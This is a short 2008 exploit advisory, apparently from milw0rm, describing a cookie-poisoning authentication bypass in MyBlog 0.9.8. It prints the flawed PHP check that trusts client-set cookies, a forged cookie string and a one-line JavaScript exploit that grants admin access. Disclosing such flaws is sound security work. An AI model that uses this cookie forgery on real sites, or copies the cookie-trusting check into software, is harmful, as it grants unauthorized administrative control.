@@ -1,0 +1,48 @@
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+MyBlog <= 0.9.8: PHP and MySQL Blog/CMS software / Cookie poisioning
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+$ Program: MyBlog
+$ File affected: all /admin/*.php files
+$ Version: 0.9.8
+$ Download: http://sourceforge.net/projects/myblog/
+
+
+Found by Pepelux <pepelux[at]enye-sec.org>
+eNYe-Sec - www.enye-sec.org
+
+MyBlog is an open source Blog/CMS project. It allows begginers to have a 
+simple to use blog/cms and it will still please developers with feature 
+packed system with plugins, themes and modules.
+
+
+You can alter cookies to get admin privileges.
+
+
+Code of add.php:
+
+<?php 
+if(isset($_COOKIE['admin']) OR isset($_COOKIE['post'])) {
+	$name = $_COOKIE['login']; 
+}
+else {
+echo "Please Login";
+	exit;
+}
+?>
+
+If you try to enter http://blog/admin you obtain: 'Please Login' and the cookie
+is some likes that:
+
+login=Pepelux; fontSize=80; PHPSESSID=913e40ece8c45da4e1ad5c6c44327926
+
+But if you change the cookie and put, for example:
+
+admin=yes; login=admin; fontSize=80; PHPSESSID=913e40ece8c45da4e1ad5c6c44327926
+
+Then you obtain complete access to the admin panel.
+
+Exploit:
+javascript:document.cookie = "admin=yes; login=admin";
+
+# milw0rm.com [2008-09-22]
